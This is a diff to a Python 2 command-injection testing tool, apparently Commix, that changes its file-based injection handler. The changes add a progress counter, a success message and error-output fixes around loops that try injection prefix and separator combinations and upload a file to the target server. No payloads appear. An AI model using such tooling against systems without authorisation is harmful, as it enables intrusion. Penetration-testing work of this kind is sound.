@@ -84,10 +84,14 @@ def fb_injection_handler(url,delay,filename,http_request_method):
   output_file.write("\n(+) Technique : " + technique.title())
   output_file.close()
   
+  i = 0
+  # Calculate all possible combinations
+  total = len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
+  
   for prefix in settings.PREFIXES:
     for suffix in settings.SUFFIXES:
       for separator in settings.SEPARATORS:
-	
+	i = i + 1
 	# Check for bad combination of prefix and separator
 	combination = prefix + separator
 	if combination in settings.JUNK_COMBINATION:
@@ -138,9 +142,25 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	    output = urllib2.urlopen(request)
 	    html_data = output.read()
 	    shell = re.findall(r""+TAG+"", html_data)
-	    
+	    if len(shell) != 0:
+	      sys.stdout.write("[ " + colors.GREEN + "SUCCEED" + colors.RESET + " ]")
+	      sys.stdout.flush()
+	      
 	  except urllib2.HTTPError, e:
-	      if e.getcode() == 404 :
+	      if e.getcode() == 404:
+		if not menu.options.verbose:
+		  percent = ((i*100)/total)
+		  if percent == 100:
+		    if no_result == True:
+		      percent = colors.RED + "FAILED" + colors.RESET
+		    else:
+		      percent = str(percent)+"%"
+		  else:
+		    percent = str(percent)+"%"
+		  sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
+		  sys.stdout.flush()
+		  continue
+		else:
 		  continue
 		
 	      elif e.getcode() == 401:
@@ -155,7 +175,7 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	  raise
 	
 	except urllib2.URLError, e:
-	  print "\n" + colors.BGRED + "(x) Error: " + e.reason + colors.RESET
+	  print "\n" + colors.BGRED + "(x) Error: " + str(e.reason) + colors.RESET
 	  sys.exit(0)
 	
 	except :
@@ -239,20 +259,18 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 		sys.exit(0)
 	    
 	  else:
+	    sys.stdout.write("(*) Continue testing the "+ technique +"... ")
+	    sys.stdout.flush()
 	    pass
 	  
   # If temp-based technique failed, 
   # use the "/tmp/" directory for tempfile-based technique.
   if no_result == True:
-    if menu.options.verbose == False:
-      print "[" + colors.RED + " FAILED "+colors.RESET+"]"
-    else:
-      print ""
     if menu.options.tmp_path:
       tmp_path = menu.options.tmp_path
     else:
       tmp_path = settings.TMP_PATH
-    tmp_upload = raw_input("(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
+    tmp_upload = raw_input("\n(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
     if tmp_upload in settings.CHOISE_YES:
       sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
       tfb_handler.exploitation(url,delay,filename,tmp_path,http_request_method)     
@@ -260,8 +278,10 @@ def fb_injection_handler(url,delay,filename,http_request_method):
       return False
   
   else :
-    print ""
-    
-    
+    sys.stdout.write("\r")
+    sys.stdout.flush()
+
 def exploitation(url,delay,filename,http_request_method):
     fb_injection_handler(url,delay,filename,http_request_method)
+
+#eof
